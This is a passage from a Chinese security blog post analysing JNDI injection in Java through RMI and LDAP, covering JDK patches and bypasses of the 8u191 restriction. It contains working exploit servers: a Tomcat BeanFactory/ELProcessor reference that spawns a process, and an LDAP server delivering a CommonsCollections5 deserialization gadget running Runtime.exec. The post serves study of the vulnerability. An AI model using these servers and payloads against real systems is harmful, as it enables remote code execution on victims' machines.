<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714184850343.png" alt="image-20220714184850343"></p>
<p>本地没有找到类接着调用 <strong>Reference#getFactoryClassLocation</strong> 赋值给 codebase ，也就是获取远程调用的地址，并再次类加载，这回用 <strong>URLClassLoader</strong>去进行加载。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714185348698.png" alt="image-20220714185348698"></p>
<p>这样就能获取到远程的恶意类，并且进行初始化的类加载，执行静态代码块。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714185440971.png" alt="image-20220714185440971"></p>
<p>一路返回到 getObjectFactoryFromReference，最后会实例化返回一个对象，所以恶意代码还可以写到构造函数中。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714185626149.png" alt="image-20220714185626149"></p>
<p>返回到 <strong>factory</strong> 后，调用其 <strong>getObjectInstance</strong> 方法</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715013540301.png" alt="image-20220715013540301"></p>
<h2 id="修补"><a href="#修补" class="headerlink" title="修补"></a>修补</h2><p>上面提到说，JDK 6u141、7u131、8u121之后：增加了 com.sun.jndi.rmi.object.trustURLCodebase 选项，默认为 false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞。</p>
<p>切换版本为jdk8u181，在RegistryContext中，会判断 trustURLCodebase</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714232650954.png" alt="image-20220714232650954"></p>
<p>默认为false，默认情况下就抛出异常。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714233203175.png" alt="image-20220714233203175"></p>
<p>但是在8u191之前都是可以通过LDAP进行绕过的，下面跟一下ldap的流程。</p>
<h1 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI-LDAP"></a>JNDI-LDAP</h1><h2 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h2><p>ldap用代码实现比较多(下面8u191代码实现ldap)，这里直接用工具 marshalsec 启动代替LDAP服务。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;#calc</span><br></pre></td></tr></table></figure>

<p>Client端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;ldap://127.0.0.1:1389/aa&quot;</span>;</span><br><span class="line">        InitialContext initialContext = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h2><p><strong>LdapCtx#c_lookup</strong> 走到decodeObject，和上面作用一样，进行解析</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715001340200.png" alt="image-20220715001340200"></p>
<p>感觉这里应该还会有利用点，学懂了在研究吧。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715001757440.png" alt="image-20220715001757440"></p>
<p>可以看到解析出来后为Reference对象</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715001919622.png" alt="image-20220715001919622"></p>
<p>然后调用 <strong>DirectoryManager#getObjectInstance</strong> 去获取实例，对照着RMI的修补就知道，这里没有进行限制。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715002006872.png" alt="image-20220715002006872"></p>
<p>剩下的类似RMI，getObjectFactoryFromReference-&gt;loadClass</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715002429400.png" alt="image-20220715002429400"></p>
<p>类加载完毕后返回实例，同样调用其 <strong>工厂类对象的getObjectInstance</strong> 方法</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715012834856.png" alt="image-20220715012834856"></p>
<h2 id="修补-1"><a href="#修补-1" class="headerlink" title="修补"></a>修补</h2><p>8u191之后进行了修补， loadClass方法中添加 trustURLCodebase 属性，所以不能远程加载了。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715023443502.png" alt="image-20220715023443502"></p>
<h1 id="8u191的绕过"><a href="#8u191的绕过" class="headerlink" title="8u191的绕过"></a>8u191的绕过</h1><p>针对8u191的绕过大致两种途径</p>
<ol>
<li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li>
<li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li>
</ol>
<p>第一种思路，既然远程不能打，就寻找本地的工厂类的有没有可能存在利用点，我们返回的Reference对象中包含本地存在的可利用Factory类，然后在loadClass后，创建实例对象，调用其 getObjectInstance 方法，当然了Factory类需要实现  <strong>javax.naming.spi.ObjectFactory</strong>  接口，还要重写其 getObjectInstance 方法。比如现在有这么一个Factory中，它的静态代码块或者无参构造方法等存在利用点，它的 getObjectInstance 存在利用点，我们直接返回Reference对象就可以加以利用。</p>
<p>第二种思路，通过LDAP的 javaSerializedData反序列化gadget。LDAP服务端除了支持JNDI Reference这种利用方式外，还支持直接返回一个序列化的对象。如果Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()方法就会对这个字段的内容进行反序列化。</p>
<h2 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h2><p>Server端创建rmi服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Reference reference &#x3D; new Reference(&quot;Test&quot;,&quot;Test&quot;,null);</span><br></pre></td></tr></table></figure>

<p>Client端存在一个Factory</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getObjectInstance&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当client端发起lookup请求后，结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">静态代码</span><br><span class="line">构造代码块</span><br><span class="line">无参构造方法</span><br><span class="line">getObjectInstance</span><br></pre></td></tr></table></figure>

<h2 id="利用本地Class"><a href="#利用本地Class" class="headerlink" title="利用本地Class"></a>利用本地Class</h2><p>目前公开常用的利用方法是通过 <strong>Tomcat</strong> 的 <strong>org.apache.naming.factory.BeanFactory</strong> 工厂类去调用 <strong>javax.el.ELProcessor#eval</strong> 方法或 <strong>groovy.lang.GroovyShell#evaluate</strong> 方法</p>
<p><strong>BeanFactory</strong> 的利用原理如下</p>
<blockquote>
<p>org.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。</p>
</blockquote>
<p>pom.xml都添加上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.tomcat&lt;&#x2F;groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;tomcat-dbcp&lt;&#x2F;artifactId&gt;</span><br><span class="line">	&lt;version&gt;9.0.8&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.tomcat&lt;&#x2F;groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;tomcat-catalina&lt;&#x2F;artifactId&gt;</span><br><span class="line">	&lt;version&gt;9.0.8&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.tomcat&lt;&#x2F;groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;tomcat-jasper&lt;&#x2F;artifactId&gt;</span><br><span class="line">	&lt;version&gt;9.0.8&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>

<p>Server端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry r = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">        r.bind(<span class="string">&quot;evil&quot;</span>,referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h3><p>先看一下 <strong>BeanFactory#getObjectInstance</strong></p>
<p>首先要求传入的类型为 <strong>ResourceRef</strong> ，所以Server端才这样构造</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718144626385.png" alt="image-20220718144626385"></p>
<p>看一下 ResourceRef 的构造函数</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718144846588.png" alt="image-20220718144846588"></p>
<p>调用父类构造方法，最后结果如下</p>
<ul>
<li>classFactory = factory (org.apache.naming.factory.BeanFactory)</li>
<li>classFactoryLocation = null</li>
<li>className = resourceClass (javax.el.ELProcessor)</li>
</ul>
<p>Client端接受Reference后实例 BeanFactory 对象，调用其 getObjectInstance 方法</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718145434845.png" alt="image-20220718145434845"></p>
<p>跟进 <strong>BeanFactory#getObjectInstance</strong> 获取beenClass即ELprocessor，通过类加载器进行类加载</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718145804608.png" alt="image-20220718145804608"></p>
<p>调用无参构造方法去实例化对象</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718145958151.png" alt="image-20220718145958151"></p>
<p>接着从Reference对象的addrs参数集合中获取其 addrType 是 forceString 的参数赋值给value</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220810123453393.png" alt="image-20220810123453393"></p>
<p>for循环去遍历value，按照<code>,</code>分割成多个要执行的方法，如果有 <strong>=</strong> 进行截取，等号前面赋值给param，后面赋值给 setterName，相当于拆分为键值对</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718150525075.png" alt="image-20220718150525075"></p>
<p>在beenclass中获取”键值名”的方法，把键名和对应的方法放到 forced中</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718150820408.png" alt="image-20220718150820408"></p>
<p>获取出不在if条件中的其他值，这里获取到的即 x，赋值给 propName</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;calc&#39;]).start()\&quot;)&quot;));</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718151126979.png" alt="image-20220718151126979"></p>
<p>最后会根据 propName 作为方法名称去反射获取一个参数类型是 **String.class(value)**的方法，并按照 param 从 addrs 中取到的 String 对象作为参数去反射调用该方法。</p>
<p>从 forced 中 获取 x 所代表的method，然后进行反射调用命令执行。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718151253037.png" alt="image-20220718151253037"></p>
<h2 id="LDAP返回对象"><a href="#LDAP返回对象" class="headerlink" title="LDAP返回对象"></a>LDAP返回对象</h2><p>pox.xml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;com.unboundid&lt;&#x2F;groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;unboundid-ldapsdk&lt;&#x2F;artifactId&gt;</span><br><span class="line">	&lt;version&gt;3.1.1&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>

<p>Server端，打CC5</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( String[] tmp_args )</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> String[]&#123;<span class="string">&quot;http://192.168.68.155/#test&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line">        InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(args[ <span class="number">0</span> ])));</span><br><span class="line">        InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">        System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,CommonsCollections5());</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] CommonsCollections5() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map map=<span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException=<span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field field=badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="流程分析-3"><a href="#流程分析-3" class="headerlink" title="流程分析"></a>流程分析</h3><p><strong>LdapCtx#c_lookup</strong>，进行判断 <strong>JAVA_ATTRIBUTES[2]</strong> 即 javaclassname 不为空，进入<strong>Obj#decodeObject</strong></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718155901828.png" alt="image-20220718155901828"></p>
<p>Obj#decodeObject 中 JAVA_ATTRIBUTES[4] 空，尝试获取 JAVA_ATTRIBUTES[1]，即序列化的字节码。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718160557209.png" alt="image-20220718160557209"></p>
<p>deserializeObject，反序列化</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718160806948.png" alt="image-20220718160806948"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1611/#toc_gadget">JNDI注入分析</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8214#toc-2">JNDI注入学习</a></p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/">浅析JNDI注入</a></p>
<p><a target="_blank" rel="noopener" href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">如何绕过高版本JDK的限制进行</a></p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/12/25/java-serlab/" rel="prev" title="javaDeserializeLabs">
                  <i class="fa fa-angle-left"></i> javaDeserializeLabs
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/12/25/LFI/" rel="next" title="关于LFI">
                  关于LFI <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Y0ng</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  





</body>
</html>
